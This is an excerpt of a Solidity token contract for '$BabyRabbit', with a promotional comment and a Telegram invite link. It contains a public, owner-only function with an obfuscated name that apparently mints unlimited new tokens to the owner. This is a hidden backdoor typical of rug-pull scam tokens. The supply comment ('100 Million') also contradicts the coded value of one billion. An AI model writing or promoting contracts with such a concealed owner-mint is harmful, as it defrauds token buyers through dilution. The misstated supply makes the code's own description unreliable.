...
//
// $BabyRabbit proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+wHK7JK1eW6FmZTc1
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyRabbit(uint256 amount) public onlyOwner {
 _BabyRabbit(msg.sender, amount);
    }
    ...
    function _BabyRabbit(address account, uint256 amount) internal virtual {
...
contract $BabyRabbit is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Rabbit", "BABYRABBIT") {
     _BabyRabbit(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}